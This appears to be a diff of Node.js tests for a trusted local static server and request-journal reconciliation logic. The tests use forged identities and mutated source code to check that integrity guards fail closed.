+test("F2-GOV-09-F13 rejects a late invalid route after the trusted server window is verified", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f13-late-invalid-"));
+  const bytes = Buffer.from("<!doctype html><title>sealed</title>");
+  await write(directory, "index.html", bytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "index.html", sha256: sha256ForTest(bytes) }], 0);
+  try {
+    const window = server.openJournalWindow();
+    window.beginQuiescence();
+    window.seal();
+    window.verify();
+    const response = await fetch(`${server.origin}/not-allowlisted`);
+    assert.equal(response.status, 409, "every request after seal must be rejected before route classification");
+    const snapshot = window.snapshot();
+    assert.equal(snapshot.state, "REJECTED");
+    assert.match(snapshot.violation ?? "", /late request after seal/i);
+  } finally {
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F13 never lets a browser observation supply a missing journal identity", () => {
+  const windowId = "window-f13-browser-not-authority";
+  const requestId = "7".repeat(64);
+  const journalId = "8".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const request = { requestId, url, route: "media/fixture.webm", range: null, resourceType: "media" };
+  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: null, rangeStart: null, rangeEnd: null, totalBytes: 32, status: 200, bytes: 32, finished: true };
+  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
+    engine: "chromium",
+    windowId,
+    localRequests: [request],
+    localResponses: [],
+    localFailures: [],
+    journal: [record],
+    journalRejections: [],
+    ...overrides,
+  });
+  assert.throws(
+    () => verify({ localResponses: [{ ...request, status: 200, journalId }], journal: [{ ...record, requestId: null }] }),
+    /extra or unattributed|identity.*absent|request identity/i,
+    "a browser response must never fill an identity absent from the server journal",
+  );
+});
+
+test("F2-GOV-09-F13 rejects duplicate indeterminate status-zero observations", () => {
+  const windowId = "window-f13-zero-cardinality";
+  const requestId = "9".repeat(64);
+  const journalId = "a".repeat(64);
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const request = { requestId, url, route: "media/fixture.webm", range: null, resourceType: "media" };
+  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: null, rangeStart: null, rangeEnd: null, totalBytes: 32, status: 200, bytes: 32, finished: true };
+  const zero = { ...request, status: 0, journalId: null };
+  assert.throws(
+    () => trustedConsumer.assertTrustedJournalBijection({
+      engine: "chromium",
+      windowId,
+      localRequests: [request],
+      localResponses: [zero, { ...zero }],
+      localFailures: [],
+      journal: [record],
+      journalRejections: [],
+    }),
+    /status 0/i,
+    "duplicate status-zero observations must fail closed",
+  );
+});
+
+test("F2-GOV-09-F15 server transports a server-owned identity to a headerless continuation", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f15-continuation-"));
+  const bytes = Buffer.from("trusted media continuation");
+  await write(directory, "fixture.webm", bytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "fixture.webm", sha256: sha256ForTest(bytes) }], 0);
+  try {
+    const window = server.openJournalWindow();
+    const firstRequestId = "1".repeat(64);
+    const first = await fetch(`${server.origin}/fixture.webm`, { headers: window.authorizeHeaders({ "x-branct-trusted-request-id": firstRequestId, range: "bytes=0-7" }) });
+    assert.equal(first.status, 206);
+    const cookie = first.headers.get("set-cookie");
+    assert.match(cookie ?? "", /HttpOnly/i, "continuation capability must not be readable by candidate JavaScript");
+    assert.match(cookie ?? "", /SameSite=Strict/i, "continuation capability must remain same-site");
+    const continuation = await fetch(`${server.origin}/fixture.webm`, { headers: { cookie, range: "bytes=8-" } });
+    assert.equal(continuation.status, 206, "a server-authorized internal continuation must never surface as status zero");
+    const continuationRequestId = continuation.headers.get("x-branct-trusted-request-id");
+    const continuationJournalId = continuation.headers.get("x-branct-trusted-journal-id");
+    assert.match(continuationRequestId ?? "", /^[0-9a-f]{64}$/);
+    assert.match(continuationJournalId ?? "", /^[0-9a-f]{64}$/);
+    assert.notEqual(continuationRequestId, firstRequestId);
+    const record = window.snapshot().records.find(({ journalId }) => journalId === continuationJournalId);
+    assert.equal(record?.requestId, continuationRequestId, "transported identity must be owned by the matching journal record");
+    assert.equal(record?.range, "bytes=8-");
+    assert.equal(record?.status, 206);
+    assert.equal(record?.finished, true);
+    const forgedRequestId = "f".repeat(64);
+    const transplanted = await fetch(`${server.origin}/fixture.webm`, { headers: { cookie, range: "bytes=0-", "x-branct-trusted-request-id": forgedRequestId } });
+    const transplantedRequestId = transplanted.headers.get("x-branct-trusted-request-id");
+    assert.equal(transplanted.status, 206);
+    assert.match(transplantedRequestId ?? "", /^[0-9a-f]{64}$/);
+    assert.notEqual(transplantedRequestId, forgedRequestId, "a cookie-only continuation must overwrite a caller-supplied identity");
+    assert.equal(window.snapshot().records.find(({ journalId }) => journalId === transplanted.headers.get("x-branct-trusted-journal-id"))?.requestId, transplantedRequestId);
+    const forged = await fetch(`${server.origin}/fixture.webm`, { headers: { cookie: "branct_trusted_continuation=forged", range: "bytes=0-" } });
+    assert.equal(forged.status, 403, "a forged continuation capability must fail closed");
+    assert.match(forged.headers.get("x-branct-trusted-rejection-id") ?? "", /^[0-9a-f]{64}$/);
+  } finally {
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F15 drains without starting a competing navigation", async () => {
+  const calls = [];
+  const page = {
+    evaluate: async (callback) => { calls.push("stop"); assert.match(String(callback), /stop/); },
+    goto: async () => { throw new Error('Navigation to "about:blank" is interrupted by another navigation to "chrome-error://chromewebdata/"'); },
+  };
+  await trustedConsumer.drainTrustedPage(page);
+  assert.deepEqual(calls, ["stop"]);
+});
+
+test("F2-GOV-09-F16 installs the server-owned continuation capability before browser traffic", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f16-cookie-"));
+  const bytes = Buffer.from("trusted continuation cookie");
+  await write(directory, "fixture.webm", bytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "fixture.webm", sha256: sha256ForTest(bytes) }], 0);
+  try {
+    const window = server.openJournalWindow();
+    assert.deepEqual(Object.keys(window.continuationCookie).sort(), ["httpOnly", "name", "sameSite", "url", "value"].sort());
+    assert.equal(window.continuationCookie.name, "branct_trusted_continuation");
+    assert.match(window.continuationCookie.value, /^[0-9a-f]{64}$/);
+    assert.equal(window.continuationCookie.url, server.origin);
+    assert.equal(window.continuationCookie.httpOnly, true);
+    assert.equal(window.continuationCookie.sameSite, "Strict");
+  } finally {
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F16 treats an already-destroyed drain context as safely stopped", async () => {
+  const page = {
+    evaluate: async () => { throw new Error("Execution context was destroyed, most likely because of a navigation"); },
+  };
+  await assert.doesNotReject(() => trustedConsumer.drainTrustedPage(page));
+});
+
+test("F2-GOV-09-F16 keeps unrelated drain failures fail-closed", async () => {
+  const page = {
+    evaluate: async () => { throw new Error("candidate drain invariant failed"); },
+  };
+  await assert.rejects(() => trustedConsumer.drainTrustedPage(page), /candidate drain invariant failed/);
+});
+
+test("F2-GOV-09-F16 does not equate a closed target with a destroyed execution context", async () => {
+  const page = {
+    evaluate: async () => { throw new Error("Target page, context or browser has been closed: unrelated protocol failure"); },
+  };
+  await assert.rejects(() => trustedConsumer.drainTrustedPage(page), /unrelated protocol failure/);
+});
+
+test("F2-GOV-09-F16 quarantines status zero and derives identity only from one completed server record", () => {
+  assert.equal(typeof trustedConsumer.reconcileQuarantinedStatusZero, "function");
+  const requestId = "a".repeat(64);
+  const journalId = "b".repeat(64);
+  const observation = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null, journalId: null, rejectionId: undefined, url: "http://127.0.0.1:4173/media/fixture.webm", route: "media/fixture.webm", range: "bytes=0-1", status: 0, resourceType: "media" };
+  const record = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId, journalId, absoluteUrl: observation.url, route: observation.route, range: observation.range, status: 206, finished: true };
+  assert.deepEqual(trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [record] }), [{
+    universe: "SERVER_INTERNAL",
+    requestId,
+    url: observation.url,
+    route: observation.route,
+    range: observation.range,
+    resourceType: observation.resourceType,
+    identityOwner: "server",
+    phase: "server-internal",
+    action: "browser-internal-request",
+  }]);
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation, { ...observation }], journal: [record] }), /cardinality|duplicate/i);
+  const conclusive = { ...observation, universe: "SERVER_INTERNAL", identityOwner: "server", requestId, journalId, rejectionId: undefined, status: 206 };
+  assert.deepEqual(trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit",
+    observations: [observation],
+    journal: [record],
+    responses: [conclusive],
+  }), [], "one conclusive server-owned response must consume, not duplicate, its indeterminate status-zero observation");
+  const secondRecord = { ...record, requestId: "c".repeat(64), journalId: "d".repeat(64) };
+  const secondConclusive = { ...conclusive, requestId: secondRecord.requestId, journalId: secondRecord.journalId };
+  assert.deepEqual(trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit",
+    observations: [observation],
+    journal: [record, secondRecord],
+    responses: [conclusive, secondConclusive],
+  }), [], "distinct conclusive responses must consume status zero only through their exact journals");
+  assert.deepEqual(trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit",
+    observations: [observation, { ...observation }],
+    journal: [record, secondRecord],
+    responses: [conclusive, secondConclusive],
+  }), [], "repeated status-zero observations add no evidence when every exact journal is conclusively covered");
+  assert.deepEqual(trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit",
+    observations: [observation],
+    journal: [record],
+    responses: [conclusive, { ...conclusive }],
+  }), [], "an exact duplicate conclusive callback must coalesce without changing cardinality");
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit",
+    observations: [observation],
+    journal: [record],
+    responses: [{ ...conclusive, journalId: "c".repeat(64) }],
+  }), /journal|identity|cardinality|conclusive/i, "a forged or transplanted conclusive journal identity must fail closed");
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit",
+    observations: [observation],
+    journal: [record],
+    responses: [{ ...conclusive, requestId: "d".repeat(64) }],
+  }), /request identity|divergent/i, "a transplanted conclusive request identity must fail closed");
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit",
+    observations: [observation],
+    journal: [record],
+    responses: [{ ...conclusive, status: 200 }],
+  }), /status.*divergent/i, "a conclusive status divergent from the journal must fail closed");
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [{ ...record, status: 0 }] }), /completed|status 0|conclusive/i);
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [{ ...record, finished: false }] }), /not completed/i, "a partial server response must fail closed");
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [{ ...observation, journalId }], journal: [record] }), /must not claim|identity/i);
+  assert.throws(() => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [] }), /cardinality|completed/i);
+});
+
+test("F2-GOV-09-F18-A-F1 binds status-zero reconciliation to the complete server-owned request schema", () => {
+  const requestId = "7".repeat(64);
+  const journalId = "8".repeat(64);
+  const observation = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null, journalId: null, rejectionId: undefined, url: "http://127.0.0.1:4173/media/fixture.webm", route: "media/fixture.webm", range: "bytes=0-1", status: 0, resourceType: "media" };
+  const record = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId, journalId, absoluteUrl: observation.url, route: observation.route, range: observation.range, status: 206, finished: true };
+  const [derived] = trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [record] });
+  assert.deepEqual(derived, {
+    universe: "SERVER_INTERNAL",
+    identityOwner: "server",
+    requestId,
+    url: observation.url,
+    route: observation.route,
+    range: observation.range,
+    resourceType: "media",
+    phase: "server-internal",
+    action: "browser-internal-request",
+  });
+  assert.equal(typeof trustedConsumer.recordReconciledServerOwnedRequests, "function", "the operational reconciliation guard is absent");
+  const requests = [];
+  trustedConsumer.recordReconciledServerOwnedRequests(requests, [derived], "webkit");
+  trustedConsumer.recordReconciledServerOwnedRequests(requests, [{ ...derived }], "webkit");
+  assert.deepEqual(requests, [derived], "an exact duplicate must coalesce to one request");
+  assert.throws(
+    () => trustedConsumer.recordReconciledServerOwnedRequests([], [{ ...derived, phase: undefined }], "webkit"),
+    /schema|phase/i,
+    "a derived request with incomplete canonical context must fail closed",
+  );
+});
+
+test("F2-GOV-09-F18-A-F1 rejects a conclusive response transplanted across resource types", () => {
+  const requestId = "9".repeat(64);
+  const journalId = "a".repeat(64);
+  const observation = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null, journalId: null, rejectionId: undefined, url: "http://127.0.0.1:4173/media/fixture.webm", route: "media/fixture.webm", range: "bytes=0-1", status: 0, resourceType: "media" };
+  const record = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId, journalId, absoluteUrl: observation.url, route: observation.route, range: observation.range, status: 206, finished: true };
+  const transplanted = { ...observation, universe: "SERVER_INTERNAL", identityOwner: "server", requestId, journalId, rejectionId: undefined, status: 206, resourceType: "document" };
+  assert.throws(
+    () => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [record], responses: [transplanted] }),
+    /resourceType.*divergent/i,
+  );
+  assert.throws(
+    () => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [{ ...observation, resourceType: undefined }], journal: [record] }),
+    /resourceType.*absent|malformed/i,
+  );
+  for (const [field, value] of [
+    ["url", "http://127.0.0.1:4173/media/transplanted.webm"],
+    ["route", "media/transplanted.webm"],
+    ["range", "bytes=2-3"],
+  ]) assert.throws(
+    () => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [record], responses: [{ ...transplanted, resourceType: "media", [field]: value }] }),
+    new RegExp(`${field}.*divergent|transplant|journal`, "i"),
+    `a response retaining the server identities while transplanting ${field} must fail closed`,
+  );
+  for (const [field, value] of [["phase", "control-probe"], ["action", "transplanted"]]) assert.throws(
+    () => trustedConsumer.recordServerOwnedRequest([], {
+      universe: "SERVER_INTERNAL", identityOwner: "server", requestId, url: observation.url, route: observation.route,
+      range: observation.range, resourceType: "media", phase: "server-internal", action: "browser-internal-request", [field]: value,
+    }, "webkit"),
+    new RegExp(`${field}.*divergent`, "i"),
+    `a first server-owned request with noncanonical ${field} must fail closed`,
+  );
+});
+
+test("F2-GOV-09-F18-A-F1 mutation controls keep resource binding and guarded derived insertion load-bearing", async () => {
+  const source = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const server = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer);
+  const mutations = [
+    ["remove url binding", /\s+assert\.equal\(response\.url, observation\.url, `\$\{engine\}: conclusive response url is divergent`\);/, "", "response", "url", "http://127.0.0.1:4173/media/transplanted.webm"],
+    ["remove route binding", /\s+assert\.equal\(response\.route, observation\.route, `\$\{engine\}: conclusive response route is divergent`\);/, "", "response", "route", "media/transplanted.webm"],
+    ["remove range binding", /\s+assert\.equal\(response\.range, observation\.range, `\$\{engine\}: conclusive response range is divergent`\);/, "", "response", "range", "bytes=2-3"],
+    ["remove canonical phase guard", /\s+assert\.equal\(request\.phase, SERVER_INTERNAL_REQUEST_CONTEXT\.phase, `\$\{engine\}: server-owned request phase is divergent`\);/, "", "request", "phase", "control-probe"],
+    ["remove canonical action guard", /\s+assert\.equal\(request\.action, SERVER_INTERNAL_REQUEST_CONTEXT\.action, `\$\{engine\}: server-owned request action is divergent`\);/, "", "request", "action", "transplanted"],
+    ["bypass guarded derived insertion", "recordServerOwnedRequest(target, request, engine);", "target.push(request);", "incomplete"],
+  ];
+  for (const [label, pattern, replacement, kind, field, value] of mutations) {
+    const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-status-zero-mutation-"));
+    try {
+      const mutated = source.replace(pattern, replacement);
+      assert.notEqual(mutated, source, `${label} mutation was a no-op`);
+      await writeFile(join(directory, "f2-gov-08-consumer.mjs"), mutated);
+      await writeFile(join(directory, "f2-gov-08-static-server.mjs"), server);
+      const module = await import(`${pathToFileURL(join(directory, "f2-gov-08-consumer.mjs")).href}?mutation=${Date.now()}-${encodeURIComponent(label)}`);
+      const requestId = "b".repeat(64);
+      const journalId = "c".repeat(64);
+  const observation = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null, journalId: null, rejectionId: undefined, url: "http://127.0.0.1:4173/media/fixture.webm", route: "media/fixture.webm", range: "bytes=0-1", status: 0, resourceType: "media" };
+      const record = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId, journalId, absoluteUrl: observation.url, route: observation.route, range: observation.range, status: 206, finished: true };
+      if (kind === "response") {
+        const response = { ...observation, universe: "SERVER_INTERNAL", identityOwner: "server", requestId, journalId, rejectionId: undefined, status: 206, [field]: value };
+        assert.doesNotThrow(() => module.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [record], responses: [response] }), `${label} must let the transplanted response escape`);
+      } else if (kind === "request") {
+        const request = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId, url: observation.url, route: observation.route, range: observation.range, resourceType: "media", phase: "server-internal", action: "browser-internal-request", [field]: value };
+        assert.doesNotThrow(() => module.recordServerOwnedRequest([], request, "webkit"), `${label} must let the noncanonical request escape`);
+      } else {
+        const incomplete = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId, url: observation.url, route: observation.route, range: observation.range, resourceType: "media" };
+        assert.doesNotThrow(() => module.recordReconciledServerOwnedRequests([], [incomplete], "webkit"), `${label} must let the incomplete derived request escape`);
+      }
+    } finally { await rm(directory, { recursive: true, force: true }); }
+  }
+});
+
+test("F2-GOV-09-F18-A-F2 enforces the complete reconciliation invariant matrix through the operational path", () => {
+  assert.equal(typeof trustedConsumer.reconcileOperationalStatusZero, "function", "the operational status-zero path is absent");
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const route = "media/fixture.webm";
+  const range = "bytes=0-1";
+  const first = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: "1".repeat(64), journalId: "2".repeat(64), absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 1, totalBytes: 2, bytes: 2, status: 206, finished: true };
+  const second = { ...first, requestId: "3".repeat(64), journalId: "4".repeat(64) };
+  const observation = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null, journalId: null, rejectionId: undefined, url, route, range, status: 0, resourceType: "media" };
+  const conclusive = {
+    universe: "SERVER_INTERNAL", identityOwner: "server", requestId: first.requestId, journalId: first.journalId,
+    rejectionId: undefined, url, route, range, status: 206, resourceType: "media",
+  };
+  const expectedSecond = {
+    universe: "SERVER_INTERNAL", identityOwner: "server", requestId: second.requestId, url, route, range,
+    resourceType: "media", phase: "server-internal", action: "browser-internal-request",
+  };
+  assert.deepEqual(trustedConsumer.reconcileOperationalStatusZero({
+    engine: "webkit", internalRequests: [], observations: [observation], journal: [first, second], internalObservations: [conclusive],
+  }), [expectedSecond], "a real conclusive SERVER_INTERNAL observation must consume exactly its own journal before derivation");
+
+  const invariants = [
+    ["observation resourceType is bound to the trusted journal classification", { observations: [{ ...observation, resourceType: "document" }] }, /resourceType.*divergent|classification/i],
+    ["status-zero observation has exact schema", { observations: [{ ...observation, attackerField: true }] }, /schema.*exact/i],
+    ["status-zero observation remains in the server-owned universe", { observations: [{ ...observation, universe: "BROWSER_CORRELATED" }] }, /observation universe.*divergent/i],
+    ["status-zero observation remains server-owned", { observations: [{ ...observation, identityOwner: "attacker" }] }, /observation ownership.*divergent/i],
+    ["status-zero observation cannot claim a rejection", { observations: [{ ...observation, rejectionId: "f".repeat(64) }] }, /must not claim a rejection/i],
+    ["conclusive response has canonical authority", { internalObservations: [{ ...conclusive, identityOwner: "attacker" }] }, /ownership|identityOwner|authority|schema/i],
+    ["conclusive response remains in the server-owned universe", { internalObservations: [{ ...conclusive, universe: "BROWSER_CORRELATED", identityOwner: "consumer" }] }, /universe.*divergent|authority/i],
+    ["conclusive response has exact schema", { internalObservations: [{ ...conclusive, attackerField: true }] }, /schema.*exact/i],
+    ["journal cannot inject its own resourceType", { journal: [{ ...first, resourceType: "document" }, second] }, /journal.*schema|resourceType.*authority/i],
+    ["journal route must have a closed resource classification", { journal: [{ ...first, route: "media/fixture.unknown" }, second] }, /resourceType classification is absent/i],
+  ];
+  for (const [label, override, expected] of invariants) assert.throws(
+    () => trustedConsumer.reconcileOperationalStatusZero({
+      engine: "webkit", internalRequests: [], observations: [observation], journal: [first, second], internalObservations: [conclusive], ...override,
+    }),
+    expected,
+    label,
+  );
+});
+
+test("F2-GOV-09-F18-A-F3 consumes status zero only through an exact conclusive browser-correlated journal", () => {
+  const url = "http://127.0.0.1:4173/media/fixture.webm";
+  const route = "media/fixture.webm";
+  const range = "bytes=0-1";
+  const requestId = "9".repeat(64);
+  const journalId = "a".repeat(64);
+  const observation = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null, journalId: null, rejectionId: undefined, url, route, range, status: 0, resourceType: "media" };
+  const record = { universe: "BROWSER_CORRELATED", identityOwner: "consumer", requestId, journalId, absoluteUrl: url, route, range, status: 206, finished: true };
+  const conclusive = { universe: "BROWSER_CORRELATED", identityOwner: "consumer", requestId, journalId, rejectionId: undefined, url, route, range, status: 206, resourceType: "media" };
+
+  assert.deepEqual(trustedConsumer.reconcileQuarantinedStatusZero({
+    engine: "webkit", observations: [observation], journal: [record], responses: [conclusive],
+  }), [], "a conclusive browser-correlated response must consume the matching indeterminate callback without promotion");
+  assert.deepEqual(trustedConsumer.reconcileOperationalStatusZero({
+    engine: "webkit", internalRequests: [], observations: [observation], journal: [record], internalObservations: [], browserResponses: [conclusive],
+  }), [], "the operational path must supply exact browser-correlated responses to the quarantine reconciler");
+  assert.throws(
+    () => trustedConsumer.reconcileQuarantinedStatusZero({ engine: "webkit", observations: [observation], journal: [record], responses: [] }),
+    /cannot promote.*browser-correlated/i,
+    "status zero alone must never promote a browser-correlated journal record",
+  );
+  assert.throws(
+    () => trustedConsumer.reconcileQuarantinedStatusZero({
+      engine: "webkit", observations: [observation], journal: [record], responses: [{ ...conclusive, requestId: "b".repeat(64) }],
+    }),
+    /request identity|cardinality|conclusive|promote/i,
+    "a transplanted browser-correlated identity must remain fail-closed",
+  );
+});
+
+test("F2-GOV-09-F18-A-F4 derives trusted response resource type from the canonical route", () => {
+  assert.equal(typeof trustedConsumer.canonicalizeTrustedLocalResourceType, "function", "canonical trusted resource classifier is absent");
+  const browserVariable = {
+    universe: "BROWSER_CORRELATED",
+    identityOwner: "consumer",
+    requestId: "1".repeat(64),
+    journalId: "2".repeat(64),
+    rejectionId: undefined,
+    url: "http://127.0.0.1:4173/media/fixture.webm",
+    route: "media/fixture.webm",
+    range: "bytes=0-",
+    status: 206,
+    resourceType: "other",
+  };
+  assert.equal(trustedConsumer.canonicalizeTrustedLocalResourceType(browserVariable, "webkit").resourceType, "media");
+  assert.throws(
+    () => trustedConsumer.canonicalizeTrustedLocalResourceType({ ...browserVariable, route: "media/fixture.unknown" }, "webkit"),
+    /resourceType classification is absent/i,
+  );
+});
+
+test("F2-GOV-09-F18-A-F4 mutation control keeps canonical route type load-bearing", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const assertGuards = (source) => {
+    assert.match(source, /const observation = canonicalizeTrustedLocalResourceType\(/);
+    assert.match(source, /resourceType: serverOwnedResourceTypeForRoute\(observation\.route, engine\)/);
+    assert.doesNotMatch(source, /const observation = \{[^\n]+resourceType: response\.request\(\)\.resourceType\(\)/);
+  };
+  assert.doesNotThrow(() => assertGuards(consumer));
+  const mutated = consumer.replace("const observation = canonicalizeTrustedLocalResourceType(", "const observation = (");
+  assert.notEqual(mutated, consumer, "trust browser type mutation did not alter bytes");
+  assert.throws(() => assertGuards(mutated), /input did not match|match the regular expression/i, "trust browser type mutation escaped");
+});
+
+test("F2-GOV-09-F18-A-F4 quarantines only exact pre-egress cancellations outside the server bijection", () => {
+  assert.equal(typeof trustedConsumer.reconcileTrustedPreEgressCancellations, "function", "trusted pre-egress cancellation reconciler is absent");
+  const request = {
+    universe: "BROWSER_CORRELATED", identityOwner: "consumer", requestId: "4".repeat(64),
+    url: "http://127.0.0.1:4173/src/img/crm-dashboard.jpg", route: "src/img/crm-dashboard.jpg", range: null,
+    resourceType: "image", phase: "measured-flow", action: "reduced-motion",
+  };
+  const failure = { ...request, reason: "net::ERR_ABORTED" };
+  const reconcile = (overrides = {}) => trustedConsumer.reconcileTrustedPreEgressCancellations({
+    engine: "chromium", localRequests: [request], localResponses: [], localFailures: [failure], journal: [], producerClosed: true, ...overrides,
+  });
+  assert.deepEqual(reconcile(), { localRequests: [], localFailures: [], preEgressCancellations: 1 });
+  assert.equal(reconcile({ localFailures: [] }).preEgressCancellations, 1, "a closed trusted producer must quarantine an unissued local request without fabricating a response");
+  assert.throws(() => reconcile({ localFailures: [], producerClosed: false }), /closed producer/i);
+  assert.throws(() => reconcile({ localFailures: [{ ...failure, reason: "net::ERR_FAILED" }] }), /reason|cancellation/i);
+  assert.throws(() => reconcile({ localFailures: [failure, { ...failure }] }), /cardinality|duplicated/i);
+  assert.throws(() => reconcile({ localResponses: [{ ...request, status: 200, journalId: "5".repeat(64), rejectionId: undefined }] }), /pre-egress.*response|cardinality/i);
+  assert.equal(reconcile({ journal: [{ requestId: request.requestId, journalId: "6".repeat(64) }] }).preEgressCancellations, 0, "a request observed by the server must remain inside the exact journal bijection");
+});
+
+test("F2-GOV-09-F18-A-F4 accepts a cancellation after one complete server-owned 200 response", () => {
+  const requestId = "9".repeat(64);
+  const journalId = "a".repeat(64);
+  const url = "http://127.0.0.1:4173/src/img/crm-dashboard.jpg";
+  const failure = { requestId, url, route: "src/img/crm-dashboard.jpg", range: null, reason: "net::ERR_ABORTED" };
+  const response = { requestId, url, route: failure.route, range: null, status: 200, journalId };
+  const journal = { sequence: 1, journalId, requestId, absoluteUrl: url, route: failure.route, range: null, rangeStart: null, rangeEnd: null, totalBytes: 32, status: 200, bytes: 32, finished: true };
+  const verify = (overrides = {}) => trustedConsumer.assertTrustedLocalFailureCorrelations({
+    engine: "chromium", failures: [failure], responses: [response], journal: [journal], journalWindow: { start: 1, end: 1 }, ...overrides,
+  });
+  assert.doesNotThrow(() => verify());
+  assert.throws(() => verify({ journal: [{ ...journal, bytes: 31 }] }), /byte count|complete|full/i);
+  assert.throws(() => verify({ journal: [{ ...journal, finished: false }] }), /incomplete/i);
+  assert.throws(() => verify({ journal: [{ ...journal, range: "bytes=0-31", rangeStart: 0, rangeEnd: 31 }] }), /range/i);
+});
+
+test("F2-GOV-09-F18-A-F4 derives a completed response-silent internal request only from the server journal", () => {
+  const record = {
+    universe: "SERVER_INTERNAL", identityOwner: "server", requestId: "b".repeat(64), journalId: "c".repeat(64),
+    absoluteUrl: "http://127.0.0.1:4173/src/img/crm-dashboard.jpg", route: "src/img/crm-dashboard.jpg", range: null,
+    status: 200, rangeStart: null, rangeEnd: null, totalBytes: 32, bytes: 32, finished: true,
+  };
+  assert.deepEqual(trustedConsumer.reconcileOperationalStatusZero({
+    engine: "chromium", internalRequests: [], observations: [], journal: [record], internalObservations: [], browserResponses: [],
+  }), [{
+    universe: "SERVER_INTERNAL", identityOwner: "server", requestId: record.requestId, url: record.absoluteUrl, route: record.route,
+    range: null, resourceType: "image", phase: "server-internal", action: "browser-internal-request",
+  }]);
+  assert.deepEqual(
+    trustedConsumer.reconcileOperationalStatusZero({ engine: "chromium", internalRequests: [], observations: [], journal: [{ ...record, universe: "BROWSER_CORRELATED", identityOwner: "consumer" }], internalObservations: [], browserResponses: [] }),
+    [],
+    "a response-silent browser-correlated record must never enter the server-owned universe",
+  );
+  assert.throws(
+    () => trustedConsumer.reconcileOperationalStatusZero({ engine: "chromium", internalRequests: [], observations: [], journal: [{ ...record, bytes: 31 }], internalObservations: [], browserResponses: [] }),
+    /byte count.*divergent/i,
+  );
+});
+
+test("F2-GOV-09-F18-A-F4 binds wrapper-divergent failures deterministically to exact pending requests", () => {
+  assert.equal(typeof trustedConsumer.resolveTrustedFailedRequestMetadata, "function", "trusted failed-request resolver is absent");
+  const request = {
+    universe: "BROWSER_CORRELATED", identityOwner: "consumer", requestId: "7".repeat(64),
+    url: "http://127.0.0.1:4173/src/img/crm-dashboard.jpg", route: "src/img/crm-dashboard.jpg", range: null,
+    resourceType: "image", phase: "measured-flow", action: "reduced-motion",
+  };
+  assert.deepEqual(trustedConsumer.resolveTrustedFailedRequestMetadata({ engine: "chromium", metadata: undefined, url: request.url, route: request.route, range: null, localRequests: [request], localFailures: [] }), request);
+  const second = { ...request, requestId: "8".repeat(64) };
+  assert.deepEqual(trustedConsumer.resolveTrustedFailedRequestMetadata({ engine: "chromium", metadata: undefined, url: request.url, route: request.route, range: null, localRequests: [request, second], localFailures: [] }), request);
+  assert.deepEqual(trustedConsumer.resolveTrustedFailedRequestMetadata({ engine: "chromium", metadata: undefined, url: request.url, route: request.route, range: null, localRequests: [request, second], localFailures: [{ ...request, reason: "net::ERR_ABORTED" }] }), second);
+  assert.throws(
+    () => trustedConsumer.resolveTrustedFailedRequestMetadata({ engine: "chromium", metadata: undefined, url: `${request.url}?forged=1`, route: request.route, range: null, localRequests: [request], localFailures: [] }),
+    /identity is absent/i,
+  );
+});
+
